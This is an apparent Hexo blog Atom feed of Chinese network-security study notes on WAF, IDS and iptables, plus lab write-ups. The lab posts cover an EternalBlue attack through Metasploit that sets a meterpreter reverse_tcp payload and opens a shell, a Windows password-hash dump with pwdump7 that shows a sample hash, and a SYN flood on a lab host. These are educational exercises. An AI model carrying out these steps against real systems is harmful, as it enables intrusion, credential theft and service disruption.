<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-06-06T01:33:29.566Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WAF -- Web应用防火墙</title>
    <link href="http://example.com/2022/06/06/WAF----Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <id>http://example.com/2022/06/06/WAF----Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/</id>
    <published>2022-06-06T01:16:53.434Z</published>
    <updated>2022-06-06T01:33:29.566Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略还专门为Web应用提供保护的一款产品。与传统防火钱不同，WAF工作在应用层。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略还专门为Web应用提供保护的一款产品。与传统防火钱不同，WAF工作在应用层</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IDS入侵检测系统</title>
    <link href="http://example.com/2022/06/06/IDS%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2022/06/06/IDS%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/</id>
    <published>2022-06-06T01:14:50.130Z</published>
    <updated>2022-06-09T02:21:53.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDS入侵检测系统"><a href="#IDS入侵检测系统" class="headerlink" title="IDS入侵检测系统"></a>IDS入侵检测系统</h1><p> IDS（intrusion detection system）<a href="https://so.csdn.net/so/search?q=%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B&spm=1001.2101.3001.7020">入侵检测</a>系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。 </p><p>专业上讲IDS就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。与防火墙不同的是，IDS入侵检测系统是一个旁路监听设备，没有也不需要跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署的唯一要求就是：IDS应当挂接（并行接入）在所有所关注流量都必须流经的链路上。</p><h2 id="入侵检测系统功能"><a href="#入侵检测系统功能" class="headerlink" title="入侵检测系统功能"></a>入侵检测系统功能</h2><ul><li>监测并分析用户和系统的活动</li><li>核查系统配置和漏洞</li><li>对操作系统进行日志管理，并识别违反安全策略的用户活动</li><li>针对已发现的攻击行为作出适当的反应，如告警、中止进程等</li></ul><h2 id="入侵检测系统的分类"><a href="#入侵检测系统的分类" class="headerlink" title="入侵检测系统的分类"></a>入侵检测系统的分类</h2><p><strong>按入侵检测形态</strong></p><ul><li>硬件入侵检测</li><li>软件入侵检测</li></ul><p><strong>按目标系统的类型</strong></p><ul><li>网络入侵检测</li></ul><p> 该类系统一般被动地在网络上监听整个网段上的信息流，通过捕获网络数据包，进行分析，能够检测该网络段上发生的网络入侵。 </p><ul><li>主机入侵检测</li></ul><p> 即在每个要保护的主机上运行一个代理程序，一般只能检测该主机上发生的入侵。它在重要的系统服务器、工作站或用户计算机上运行，监视操作系统或系统事件级别的可疑活动（如尝试登录失败等）。此类系统需要定义清楚哪些是不合法的活动，然后把这种安全策略转换成入侵检测规则。 </p><ul><li>混合型</li></ul><p><strong>按系统结构</strong></p><ul><li>集中式</li><li>分布式</li></ul><p> 一般由多个部件组成，分布在网络的各个部分，每个部件完成相应功能，分别进行数据采集、数据分析等。通过中心的控制部件，进行数据汇总、分析、产生入侵警报等。在这种“分布式IDS（入侵检测系统）”的结构下，不仅可以检测到针对单独主机的入侵，同时也可以检测到针对该网段上的主机的入侵。 </p><h2 id="入侵检测系统原理"><a href="#入侵检测系统原理" class="headerlink" title="入侵检测系统原理"></a>入侵检测系统原理</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>收集的内容包括系统、网络、数据及用户活动的状态和行为<br> 入侵检测利用的信息一般来自以下四个方面：</p><ul><li><p>系统日志：黑客经常在系统日志中留下他们的踪迹，因此，充分利用系统日志是非常重要的</p></li><li><p>目录以及文件的异常改变：网络环境中的文件系统包含很多软件和数据文件，包含重要信息的文 件和私有数据文件经常是黑客修改或破坏的目标</p></li><li><p>程序执行中的异常行为 网络系统上的程序执行一般包括操作系统、网络服务、用户启动的程 序和特定目的的应用，例如数据库服务器。每个在系统上执行的程序由一 到多个进程来实现。每个进程执行在具有不同权限的环境中，这种环境控 制着进程可访问的系统资源、程序和数据文件等。一个进程出现了不期望 的行为可能表明黑客正在入侵你的系统。黑客可能会将程序或服务的运行 分解，从而导致运行失败，或者是以非用户或非管理员意图的方式操作</p></li><li><p>物理形式的入侵信息 这包括两个方面的内容，一是未授权的对网络硬件连接；二是对物理 资源的未授权访问</p></li></ul><h3 id="2-数据分析"><a href="#2-数据分析" class="headerlink" title="2.数据分析"></a>2.数据分析</h3><p>一般通过三种技术手段进行分析： 模式匹配， 统计分析和完整性分析。 其中前两种方法用于实时的入侵检测，而完整性分析则用于事后分析。</p><ul><li><p>模式匹配：模式匹配就是将收集到的信息与已知的网络入侵和系统误用模式数据 库进行比较，从而发现违背安全策略的行为</p></li><li><p>统计分析 ：统计分析方法首先给系统对象（如用户、文件、目录和设备等）创建 一个统计描述，统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生。其优点是可 检测到未知的入侵和更为复杂的入侵，缺点是误报、漏报率高，且不适应 用户正常行为的突然改变</p></li><li><p>完整性分析 完整性分析主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。其优点是不管模式匹配方法和统计分析方法能否发现入侵，只要 是有入侵行为导致了文件或其他对象的任何改变，它都能够发现。缺点是 一般以批处理方式实现，不用于实时响应</p></li></ul><h3 id="分析引擎："><a href="#分析引擎：" class="headerlink" title="分析引擎："></a>分析引擎：</h3><p> <strong>1、误用检测技术</strong><br>基于模式匹配原理。收集非正常操作的行为特征，建立相关的特征库，当监测的用户或系统行为与库中的记录相匹配时，系统就认为这种行为是入侵。 </p><p> <strong>2、异常检测技术</strong><br>基于统计分析原理。首先总结正常操作应该具有的特征（用户轮廓），试图用定量的方式加以描述，当用户活动与正常行为有重大偏离时即被认为是入侵。 </p><p> 3.入侵响应</p><p> <strong>主动响应：</strong> 入侵检测系统在检测到入侵后能够阻断攻击、影响进而改变攻击的进程。 </p><p> <strong>被动响应：</strong> 入侵检测系统仅仅简单地报告和记录所检测出的问题。 </p><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><ul><li>事件产生器：它的目的是从整个计算环境中获得事件，并向系统的其他部分提供此事件。</li><li>事件分析器：分析数据，发现危险、异常事件，通知响应单元</li><li>响应单元：对分析结果作出反应</li><li>事件数据库：存放各种中间和最终数据</li></ul><p><img src="/E:/git-blog\source\images\1654741185264.png" alt="1654741185264"></p><h3 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h3><h2 id="入侵行为的特征"><a href="#入侵行为的特征" class="headerlink" title="入侵行为的特征"></a>入侵行为的特征</h2><p>一组能确定网络访问或系统行为是入侵行为的字符串、数据、行为模式或符号组合等，入侵行为的这些特征，是入侵检测系统鉴别入侵行为的基本依据。<br>对于NIDS，入侵行为的特征，可以是IP地址、端口号、某些标志组合、数据包长度以及数据包内容中包含的特定字符串等。<br>对于HIDS，入侵行为的特征还包括对目标系统频繁访问尝试、对系统配置文件的访问尝试以及目标系统上运行（安装）程序的名称、占用的端口号、注册表项等的读取。</p><h2 id="IDS和防火墙联动"><a href="#IDS和防火墙联动" class="headerlink" title="IDS和防火墙联动"></a>IDS和防火墙联动</h2><p>通过IDS来发现，通过防火墙来阻断。但由于迄今为止没有统一的接口规范，加上越来越频发的“瞬间攻击”（一个会话就可以达成攻击效果，如SQL注入、溢出攻击等），使得IDS与防火墙联动在实际应用中的效果不显著。 ‘</p><p><a href="https://blog.csdn.net/weixin_43606134/article/details/106351223">https://blog.csdn.net/weixin_43606134/article/details/106351223</a></p><p> <a href="https://blog.csdn.net/hexf9632/article/details/90698399">(74条消息) IDS入侵检测系统_半砖的博客-CSDN博客_入侵检测系统</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDS入侵检测系统&quot;&gt;&lt;a href=&quot;#IDS入侵检测系统&quot; class=&quot;headerlink&quot; title=&quot;IDS入侵检测系统&quot;&gt;&lt;/a&gt;IDS入侵检测系统&lt;/h1&gt;&lt;p&gt; IDS（intrusion detection system）&lt;a href=&quot;h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>永恒之蓝漏洞利用</title>
    <link href="http://example.com/2022/05/30/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2022/05/30/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2022-05-30T01:58:45.137Z</published>
    <updated>2022-05-30T02:01:17.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</p><p>  永恒之蓝是指2017年5月12日起，全球范围内爆发的基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>  基于metasploit渗透平台，调用永恒之蓝攻击模块，将远程渗透攻击模式设置为reverse_tcp模式，攻击成功后获取远程主机的系统权限。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>目标靶机：Win2012Server（存在MS17_010漏洞）</p><p>测试渗透机：KALI平台（Metasploit软件）</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p><strong>启用永恒之蓝攻击模块</strong></p><p><img src="/E:/git-blog\source\images\1653875781181.png" alt="1653875781181"></p><p><strong>设置<strong><strong>MSF</strong></strong>参数</strong></p><p>（1）设置靶机IP地址：</p><p>set rhost 【目标靶机IP】</p><p>（2）设置payload： set payload windows/x64/meterpreter/reverse_tcp</p><p>（3）设置本机地址（本机地址点击操作机查看）： set lhost 【操作机IP】</p><p><img src="/E:/git-blog\source\images\1653875814112.png" alt="1653875814112"></p><p>（1）输入 shell 命令进入靶机的cmd命令行界面</p><p>（2）在靶机的cmd中输入 whoami 查看shell权限</p><p><img src="/E:/git-blog\source\images\1653875898261.png" alt="1653875898261"></p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p> 永恒之蓝漏洞的防护措施首先是及时更新操作系统补丁，将漏洞修补；同时将一些不用的敏感端口，例如135、139、445等端口进行关闭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>window7密码破解</title>
    <link href="http://example.com/2022/05/30/window7%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://example.com/2022/05/30/window7%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2022-05-30T00:48:24.607Z</published>
    <updated>2022-05-30T01:17:55.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>   早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为<strong>NTLM</strong>。现在已经有了更新的NTLMv2以及Kerberos验证体系。</p><p>   Windows加密过的密码口令，我们称之为<strong>hash</strong>（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。在Windows中使用安全帐户管理器 (SAM) 数据库中或 Active Directory 数据库中存储用户记录。每个密码被加密并存储在 SAM 数据库中或在 Active Directory 数据库。</p><p><strong>Windows<strong><strong>系统下的</strong></strong>hash**<strong>密码格式为：用户名称</strong></strong>:RID:LM-HASH<strong><strong>值</strong></strong>:NT-HASH**<strong>值</strong></p><p>例如： 用户名称为：Administrator</p><p>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p><p> 表示R为：</p><p> ID为：500</p><p> LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE </p><p>NT-HASH值为：683020925C5D8569C23AA724774CE6CC</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>pwdump7</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>​         用管理员身份打开命令终端窗口cmd  </p><p><img src="/E:/git-blog\source\images\1653871562482.png" alt="1653871562482"></p><p>在线查询平台获取密码</p><p><img src="/E:/git-blog\source\images\1653871616424.png" alt="1653871616424"></p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>应对口令破解的对策就是设置强健的密码。至少超过8位，用各种字母、数字、符号组合。字母：a-z；数字：0-9；符号：@#$……。同时还要定期更换密码口令</p><p>参考： [<a href="https://cloud.tencent.com/developer/article/1765592">ffffffff0x] 浅谈windows认证原理 - 云+社区 - 腾讯云 (tencent.com)</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;   早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>防火墙技术</title>
    <link href="http://example.com/2022/05/26/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    <id>http://example.com/2022/05/26/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/</id>
    <published>2022-05-26T02:35:29.012Z</published>
    <updated>2022-05-26T02:36:29.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p> 防火墙可分为<strong>软件防火墙</strong>和<strong>硬件防火墙</strong>。软件防火墙又可分为<strong>个人防火墙</strong>和<strong>网关防火墙</strong>。 </p><h5 id="个人防火墙"><a href="#个人防火墙" class="headerlink" title="个人防火墙"></a>个人防火墙</h5><p>个人防火墙运行在 PC 上，用于监控 PC 和外网的通信信息。在 Windows 操作系统中集成了 Windows 防火墙。</p><p><strong>网关防火墙</strong><br>在网络中的网关上配置防火墙的功能，能对网络中的流量进行策略控制，这就是网关防火墙。</p><p>网关防火墙分为两种，一种是在 Windows 、Linux 等操作系统上安装并运行防火墙软件的软件网关防火墙，另一种是使用专用设备的硬件网关防火墙。</p><p>个人防火墙主要监控 PC 的通信流量，网关防火墙是监控网络中所有终端的通信流量，在网关处进行策略控制。</p><h5 id="硬件防火墙"><a href="#硬件防火墙" class="headerlink" title="硬件防火墙"></a>硬件防火墙</h5><p>通过硬件设备实现的防火墙叫做<strong>硬件防火墙</strong>，外形跟路由器相似，接口类型通常有千兆网口、万兆光口。</p><h1 id="防火相关技术"><a href="#防火相关技术" class="headerlink" title="防火相关技术"></a>防火相关技术</h1><p>1.包过滤技术</p><p><img src="/E:/git-blog\source\images\1653530737743.png" alt="1653530737743"></p><p><img src="/E:/git-blog\source\images\1653530890142.png" alt="1653530890142"></p><p><img src="/E:/git-blog\source\images\1653530934175.png" alt="1653530934175"></p><h1 id="关于Iptables"><a href="#关于Iptables" class="headerlink" title="关于Iptables"></a>关于Iptables</h1><p>Linux防火墙由两个组件netfilter和iptables组成，通常也称为iptables防火墙</p><ul><li>netfilter是内核的一部分，由一些数据包过滤表组成，这些表包含内核用来控制数据包过滤处理的规则集</li><li>iptables组件是一种工具，运行在用户空间，可对数据包过滤表中的规则进行插入、修改和删除</li></ul><p>iptables包含4个表，5个链:</p><ul><li><p>4个表:raw，mangle，nat，filter，优先级:raw&gt;mangle&gt;nat&gt;filter。</p></li><li><p>5个链:PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING。</p></li></ul><p>链是数据包传输的路径，表是功能的集合。</p><p><img src="/E:/git-blog\source\images\1653531184370.png" alt="1653531184370"></p><p><img src="/E:/git-blog\source\images\1653531268731.png" alt="1653531268731"></p><p><strong>lptables工具基本命令:</strong><br>iptables [-t table] command chain-name [match] [target/jump]</p><p>iptables -P chain-name DROP/ ACCEPT/REJECT</p><p><img src="/E:/git-blog\source\images\1653531620100.png" alt="1653531620100"></p><p><strong>command chain-name，指定iptables执行的动作，包括插入规则，删除规则和添加规则。</strong><br>-P –policy链名&gt;定义默认策略<br>-L –list链名&gt;查看iptables规则列表<br>-A–append链名&gt;在规则列表的最后增加1条规则-l –insert链名&gt;在指定的位置插入1条规则</p><p>-D–delete链名&gt;从规则列表中删除1条规则</p><p>-R–replace链名&gt;替换规则列表中的某条规则</p><p>-F–flush链名&gt;删除表中所有规则<br>-Z –zero链名&gt;数据包计数器和流量计数器归零-x –delete-chain链名&gt;删除自定义链<br>-y ..- verbose …链名&gt;..与-L命令显示更多更详细的信息</p><p><strong>parameter，指定数据包与规则所匹配的特征，包括源地址，目的地址，传输协议和端口号等。</strong><br>-i–in-interface网络接口名&gt;指定数据包流入的网络接口</p><p>-o–out-interface网络接口名&gt;指定数据包流出网络接口</p><p>-p–proto指定匹配的协议，如TCP、UDP和ICMP等<br>-s–source源地址或子网&gt;指定数据包匹配的源地址<br>-d–destination目的地址或子网&gt;指定数据包匹配的目的地址</p><p>–tcp-flags TCP连接标记&gt;指定对TCP连接的标记进行匹配</p><p>–icmp-type ICMP报文类型&gt;指定对ICMP报文类型进行匹配</p><p>–sport源端口号&gt;指定数据包匹配的源端口号<br>–dport目的端口号&gt;指定数据包匹配的目的端口号<br>-m - match匹配的模块指定数据包规则所使用的过滤模块</p><p>-j，指定了当前面的条件都满足时，iptabIes执行的动作。<br>iptab les处理动作除了ACCEPT、REJECT、 DROP外，还包括RED IRECT、MASQUERADE、 LOG、 ULOG、 DNAT、 RETURN、 TOS、 SNAT、MI RROR、QUEUE、TTL、MARK等。</p><p><a href="https://blog.csdn.net/networktp/article/details/122658292">https://blog.csdn.net/networktp/article/details/122658292</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h1&gt;&lt;p&gt; 防火墙可分为&lt;strong&gt;软件防火墙&lt;/strong&gt;和&lt;strong&gt;硬件防火墙&lt;/strong&gt;。软件防火墙又可分为&lt;strong&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/05/17/TCP%20IP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2022/05/17/TCP%20IP%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-05-17T10:35:23.535Z</published>
    <updated>2022-05-17T10:35:23.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>利用 IP 进行通信时所必须用到的协议群的统称 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TCP-IP协议&quot;&gt;&lt;a href=&quot;#TCP-IP协议&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP协议&quot;&gt;&lt;/a&gt;TCP/IP协议&lt;/h1&gt;&lt;h2 id=&quot;定义：&quot;&gt;&lt;a href=&quot;#定义：&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>拒绝服务攻击</title>
    <link href="http://example.com/2022/05/03/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2022/05/03/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</id>
    <published>2022-05-03T09:29:41.088Z</published>
    <updated>2022-05-09T12:28:49.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="剧毒包型拒绝服务攻击"><a href="#剧毒包型拒绝服务攻击" class="headerlink" title="剧毒包型拒绝服务攻击"></a>剧毒包型拒绝服务攻击</h3><h4 id="碎片攻击"><a href="#碎片攻击" class="headerlink" title="碎片攻击"></a>碎片攻击</h4><p> IP首部有两个字节表示整个IP数据包的长度，所以IP数据包最长只能为0xFFFF，就是65535字<br> 节。如果有意发送总长度超过65535的IP碎片，一些老的系统内核在处理的时候就会出现问题<br> ，导致崩溃或者拒绝服务。另外，如果分片之间偏移量经过精心构造，一些系统就无法处理，<br> 导致死机。</p><h4 id="Ping-of-Death攻击"><a href="#Ping-of-Death攻击" class="headerlink" title="Ping of Death攻击"></a>Ping of Death攻击</h4><p> ping of death是利用ICMP协议的一种碎片攻击。攻击者发送一个长度超过65535的Echo Req<br> uest数据包，目标主机在重组分片的时候会造成事先分配的65535字节缓冲区溢出，系统通常<br> 会崩溃或挂起。</p><h4 id="Land攻击"><a href="#Land攻击" class="headerlink" title="Land攻击"></a>Land攻击</h4><p> 利用了TCP连接建立的三次握手过程，通过向一个目标计算机发送一个TCP SYN报文（连接<br> 建立请求报文）而完成对目标计算机的攻击。与正常的TCP SYN报文不同的是，LAND攻击报文的源IP地址和目的IP地址是相同的，都是目标计算机的IP地址。这样目标计算机接收到这个SYN报文后，就会向该报文的源地址发送一个ACK报文，并建立一个TCP连接控制结构（TCB），而该报文的源地址就是自己，因此，这个ACK报文就发给了自己。这样如果攻击者发送了足够多的SYN报文，则目标计算机的TCB可能会耗尽，最终不能正常服务。这也是一种DOS攻击。</p><h4 id="循环攻击"><a href="#循环攻击" class="headerlink" title="循环攻击"></a>循环攻击</h4><p>  在一个死循环中不停的发送一个ICMP/UDP的IP碎片，可以使Windows系统的机器死<br> 锁。</p><h3 id="风暴型拒绝服务攻击"><a href="#风暴型拒绝服务攻击" class="headerlink" title="风暴型拒绝服务攻击"></a>风暴型拒绝服务攻击</h3><h4 id="直接风暴型拒绝服务攻击"><a href="#直接风暴型拒绝服务攻击" class="headerlink" title="直接风暴型拒绝服务攻击"></a>直接风暴型拒绝服务攻击</h4><p>以多个随机的源主机地址向目的主机发送超大量的随机或特定的包，造成目标主机不能处理其他正常的包。</p><h5 id="Syn-Flood"><a href="#Syn-Flood" class="headerlink" title="Syn Flood"></a>Syn Flood</h5><p>攻击原理：依据tcp建立连接的三次握手。此攻击以多个随机的源主机地址向目的主机发送syn包，而在收到目的主机的syn＋ack包后并不回应，目的主机就为这些源主机建立大量的连接队列，由于没有收到ack一直维护这些连接队列，造成资源的大量消耗而不能向正常的请求提供服务。与之类似的攻击方式还有ackflood、s-ackflood、finflood、rstflood、tcpflood 。</p><h5 id="Http-Flood"><a href="#Http-Flood" class="headerlink" title="Http Flood"></a>Http Flood</h5><p>攻击原理：此攻击类型主要攻击目标为Web服务器上的网页访问服务，当发生攻击时攻击者向被攻击服务器大量高频的发送一个网页或多个网页的请求服务，使服务器忙于向攻击者提供响应资源从而导致不能想正常的合法用户提供请求响应服务。</p><h4 id="反射型拒绝服务攻击"><a href="#反射型拒绝服务攻击" class="headerlink" title="反射型拒绝服务攻击"></a>反射型拒绝服务攻击</h4><p>反射型的 DDoS 攻击是一种新的变种。攻击者并不直接攻击目标服务 IP，而是利用互联网的某些特殊服务开放的服务器，通过伪造被攻击者的 IP 地址、向有开放服务的服务器发送构造的请求报文，该服务器会将数倍于请求报文的回复数据发送到被攻击 IP（很多协议的请求包要远小于回复包，以一个字节的数据换十个字节的数据回来，这就是一种放大），从而对后者间接形成 DDoS 攻击。</p><h5 id="Ntp-Request-Flood"><a href="#Ntp-Request-Flood" class="headerlink" title="Ntp Request Flood"></a>Ntp Request Flood</h5><p>攻击原理：Ntp协议即为网络时间同步的udp协议，用于在分布式NTP服务器和客户端之间进行时间同步。NTP攻击，基于UDP协议，攻击者向NTP服务器发送大量的请求报文，占用服务器带宽使其阻塞，达到NTP攻击的目的。</p><h5 id="Udp-反射-Flood"><a href="#Udp-反射-Flood" class="headerlink" title="Udp 反射 Flood"></a>Udp 反射 Flood</h5><p>攻击原理：有时被保护服务器也有同外部服务器进行udp交互的需求，攻击者就会利用此交互对被保护服务器进行udp反射放大攻击。此攻击在短时间那冒充被攻击地址向外部公用的服务器发送大量的udp请求包，外部服务器收到虚假的udp请求就会回复大量的回应包给被攻击服务器地址，造成目标主机被保护服务器不能处理其他正常的交互流。</p><h2 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h2><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>类型：Syn Flood</p><p>攻击机：Kali</p><p>目标机：win7</p><p>方案：首先扫描网段，选择攻击目标，确认能够连通之后（简单地使用ping命令即可，或者检测是否未host状态）伪装自身ip，发起攻击，攻击者使用53端口，攻击端口为445端口（一个tcp端口，且大多数人都不会关闭），接下来发出攻击，目标主机会瘫痪，并无法响应，如果成效不佳，修改发包速度即可。</p><p> 步骤：</p><p>扫描网段：</p><p>​           <img src="/images/1651656101098.png" alt="1651656101098">                     </p><p>.2为网关，.135为攻击目标，.10为攻击机</p><p>Ping命令测试是否连接</p><p>  <img src="/images/1651656118160.png" alt="1651656118160"></p><p>扫描开放端口</p><p>  <img src="/images/1651656131091.png" alt="1651656131091"></p><p>终端中写出命令攻击</p><p>  <img src="/images/1651656138623.png" alt="1651656138623"></p><p>攻击后抓包结果：发包成功！</p><p>  <img src="/images/1651656145372.png" alt="1651656145372"></p><p>被攻击端查看分析更加细节的参数。</p><p><img src="/images/1651659917685.png" alt="1651659917685"></p><p>啊这 发现攻击端CPU资源占满了，尴尬了，应该是虚拟机建立时分配给kali机的资源太少了。</p><p><img src="/images/1651656161608.png" alt="1651656161608"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;拒绝服务攻击&quot;&gt;&lt;a href=&quot;#拒绝服务攻击&quot; class=&quot;headerlink&quot; title=&quot;拒绝服务攻击&quot;&gt;&lt;/a&gt;拒绝服务攻击&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="http://example.com/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-04-15T13:07:58.616Z</published>
    <updated>2022-04-15T13:07:58.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反序列化漏洞&quot;&gt;&lt;a href=&quot;#反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;反序列化漏洞&quot;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>命令注入攻击</title>
    <link href="http://example.com/2022/04/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
